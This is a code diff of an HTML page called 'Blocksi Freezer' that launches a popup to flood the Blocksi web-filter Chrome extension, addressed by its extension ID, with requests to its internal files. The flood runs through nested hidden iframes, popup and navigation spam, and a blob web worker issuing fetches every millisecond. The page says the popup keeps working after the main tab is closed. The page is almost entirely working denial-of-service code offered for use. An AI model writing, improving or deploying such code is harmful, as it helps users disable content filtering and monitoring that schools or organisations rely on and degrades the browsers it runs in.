@@ -1,138 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>Blocksi Freezer</title>
   <style>
-    body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 20px; text-align: center; }
-    button { background: #da3633; color: white; border: none; padding: 15px 30px; font-size: 20px; cursor: pointer; border-radius: 4px; }
+    body { background: #0d1117; color: #c9d1d9; font-family: monospace; text-align: center; padding-top: 60px; }
+    button { background: #da3633; color: white; border: none; padding: 18px 40px; font-size: 22px; cursor: pointer; border-radius: 6px; }
     button:hover { background: #f85149; }
-    .note { margin-top: 15px; color: #ffa657; }
+    #status { margin-top: 20px; color: #ffa657; }
   </style>
 </head>
 <body>
-  <h1>Blocksi Freezer</h1>
-  <p>Opens a persistent popup. Close this main tab safely after clicking.</p>
-  <button id="startBtn">LAUNCH POPUP ATTACK</button>
-  <p class="note" id="status">Click the button above.</p>
+  <h1>⚡ Turbo Blocksi Freezer</h1>
+  <p>Click the button, then close this tab – the popup keeps working.</p>
+  <button id="startBtn">🔥 LAUNCH POPUP ATTACK</button>
+  <div id="status">Ready.</div>
 
   <script>
     document.getElementById('startBtn').addEventListener('click', function() {
-      const popup = window.open('about:blank', '_blank', 'popup=1,menubar=no,toolbar=no,location=no,status=no,resizable=no,scrollbars=no,width=400,height=150');
+      let popup = window.open('', '_blank', 'width=420,height=220,menubar=no,toolbar=no,location=no,status=no,resizable=no,scrollbars=yes');
       if (!popup) {
-        document.getElementById('status').innerHTML = 'Popup blocked! Please allow popups for this site and try again.';
+        document.getElementById('status').innerHTML = '⚠️ Popup blocked! Please allow popups for this site.';
         return;
       }
-      document.getElementById('status').innerHTML = 'Popup launched! You can close this tab now.';
+      document.getElementById('status').innerHTML = '✅ Popup launched. You can close this tab now.';
 
-      const attackScript = `
-        const BLOCKSI_ID = 'ghlpmldmjjhmdgmneoaibbegkjjbonbk';
-        const TARGETS = [
-          'chrome-extension://' + BLOCKSI_ID + '/manifest.json',
-          'chrome-extension://' + BLOCKSI_ID + '/blockPage.html',
-          'chrome-extension://' + BLOCKSI_ID + '/background.js',
-          'chrome-extension://' + BLOCKSI_ID + '/sw.js',
-          'chrome-extension://' + BLOCKSI_ID + '/service-worker.js',
-          'chrome-extension://' + BLOCKSI_ID + '/_generated_background_page.html'
-        ];
+      const BLOCKSI_ID = 'ghlpmldmjjhmdgmneoaibbegkjjbonbk';
+      const TARGETS = [
+        'chrome-extension://' + BLOCKSI_ID + '/blockPage.html',
+        'chrome-extension://' + BLOCKSI_ID + '/manifest.json',
+        'chrome-extension://' + BLOCKSI_ID + '/background.js',
+        'chrome-extension://' + BLOCKSI_ID + '/sw.js'
+      ];
 
-        function log(msg) {
-          const el = document.getElementById('log');
-          if (el) el.innerHTML += msg + '<br>';
-        }
-
-        function startWorkerAttack() {
-          const workerCode = '
-            const TARGETS = ' + JSON.stringify(TARGETS) + ';
-            let counter = 0;
-            function flood() {
-              const url = TARGETS[counter % TARGETS.length];
-              counter++;
-              fetch(url, { mode: 'no-cors', cache: 'reload' }).catch(() => {});
-              setTimeout(flood, 0);
-            }
-            for(let i = 0; i < 10; i++) {
-              setTimeout(flood, i * 1);
-            }
-            setInterval(() => {
-              const url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
-              const xhr = new XMLHttpRequest();
-              xhr.open('GET', url, true);
-              xhr.send();
-            }, 0);
-          ';
-          const blob = new Blob([workerCode], { type: 'application/javascript' });
-          const workerUrl = URL.createObjectURL(blob);
-          const worker = new Worker(workerUrl);
-          log('✅ Worker flood started.');
-        }
-
-        function startIframeAttack() {
-          let iframes = [];
-          for (let i = 0; i < 20; i++) {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = TARGETS[i % TARGETS.length] + '?init=' + i;
-            document.body.appendChild(iframe);
-            iframes.push(iframe);
+      let popupHtml = `
+      <!DOCTYPE html>
+      <html>
+      <head><title>Freezing Blocksi</title>
+      <style>
+        body { margin:0; background:#0d1117; color:#3fb950; font-family:monospace; padding:12px; }
+        #log { font-size:13px; height:140px; overflow:auto; word-wrap:break-word; }
+      </style>
+      </head>
+      <body>
+        <div id="log">[System] Engaging Blocksi freeze...</div>
+        <script>
+          const ID = '${BLOCKSI_ID}';
+          const URLS = ${JSON.stringify(TARGETS)};
+          let idx = 0;
+          function getUrl() {
+            return URLS[idx++ % URLS.length] + '?r=' + Math.random();
           }
-          function reloadAll() {
-            for (let iframe of iframes) {
-              const url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
-              iframe.src = url + '?r=' + Math.random() + '&t=' + Date.now();
-            }
-            setTimeout(reloadAll, 0);
-          }
-          setTimeout(reloadAll, 10);
-          log('✅ Iframe flood started.');
-        }
 
-        function startPopupAttack() {
-          let count = 0;
-          setInterval(() => {
-            const url = TARGETS[count % TARGETS.length];
-            const win = window.open(url, '_blank', 'width=1,height=1');
-            if (win) {
-              setTimeout(() => {
-                try { win.close(); } catch(e) {}
-              }, 5);
-            }
-            count++;
-          }, 10);
-          log('✅ Popup spam started.');
-        }
+          let parents = [];
+          let counter = 0;
 
-        function startNavigationAttack() {
-          const navFrame = document.createElement('iframe');
-          navFrame.style.display = 'none';
-          document.body.appendChild(navFrame);
-          setInterval(() => {
-            const url = TARGETS[Math.floor(Math.random() * TARGETS.length)] + '?nav=' + Date.now();
+          function flood() {
+            let p = document.createElement('iframe');
+            p.style.display = 'none';
+            document.body.appendChild(p);
+            parents.push(p);
             try {
-              navFrame.contentWindow.location.replace(url);
-            } catch(e) {}
-          }, 0);
-          log('✅ Navigation spam started.');
-        }
+              let d = p.contentDocument || p.contentWindow.document;
+              if (d) {
+                for (let i = 0; i < 50; i++) {
+                  let child = d.createElement('iframe');
+                  child.src = getUrl();
+                  child.style.width = child.style.height = '1px';
+                  d.body.appendChild(child);
+                }
+              }
+            } catch (e) {}
+            while (parents.length > 8) {
+              let old = parents.shift();
+              if (old.parentNode) old.parentNode.removeChild(old);
+            }
+            counter++;
+            if (counter % 50 === 0) {
+              let logEl = document.getElementById('log');
+              if (logEl) logEl.innerHTML = '[System] ' + (counter * 10) + 'ms elapsed, still freezing.<br>';
+            }
+            setTimeout(flood, 10);
+          }
 
-        document.write('
-          <html>
-            <head><title>Blocksi Freezer Running</title>
-            <style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:10px;}#log{font-size:12px;height:100px;overflow:auto;}</style>
-            </head>
-            <body>
-              <h3 style="margin:0;color:#3fb950;">⚡ Freezing Blocksi...</h3>
-              <div id="log">[System] Attacks engaged.<br></div>
-            </body>
-          </html>
-        ');
+          (function workerAttack() {
+            const wCode = 'const T=' + JSON.stringify(URLS) + ';let c=0;setInterval(()=>{fetch(T[c++%T.length]+"?w="+Date.now(),{mode:"no-cors",cache:"reload"}).catch(()=>{});},1);';
+            const blob = new Blob([wCode], { type: 'application/javascript' });
+            const w = new Worker(URL.createObjectURL(blob));
+          })();
 
-        startWorkerAttack();
-        startIframeAttack();
-        startPopupAttack();
-        startNavigationAttack();
+          flood();
+          document.getElementById('log').innerHTML = '[System] Flood started. Close main tab safely.<br>';
+        <\/script>
+      </body>
+      </html>
       `;
 
-      popup.document.write(attackScript);
+      popup.document.write(popupHtml);
       popup.document.close();
     });
   </script>
